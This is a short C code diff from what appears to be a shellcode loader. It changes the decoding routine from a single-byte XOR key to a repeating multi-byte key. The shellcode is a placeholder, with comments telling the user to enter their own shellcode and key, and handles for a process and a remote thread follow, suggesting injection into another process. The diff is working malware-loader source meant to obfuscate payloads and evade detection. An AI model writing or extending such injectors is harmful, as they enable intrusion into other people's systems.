@@ -33,14 +33,13 @@ int main(int argc, char* argv[])
 void shellcode()
 {
 
-    unsigned char shellcode[] = "\x90\x90\x90"; // Place shellcode here
-    char key = 'K'; // Change key here
+    unsigned char shellcode[] = "\x90\x90\x90"; //Enter shellcode here
+    char key[] = "key"; //Enter key here
+    int keylen = strlen(key);
     int i = 0;
-    for (i; i < sizeof(shellcode) - 1; i++)
-    {
-        shellcode[i] = shellcode[i] ^ key;
+    for (i; i < sizeof(shellcode) - 1; i++) {
+        shellcode[i] = shellcode[i] ^ key[i % keylen];
     }
-
 
     HANDLE processHandle;
     HANDLE remoteThread;
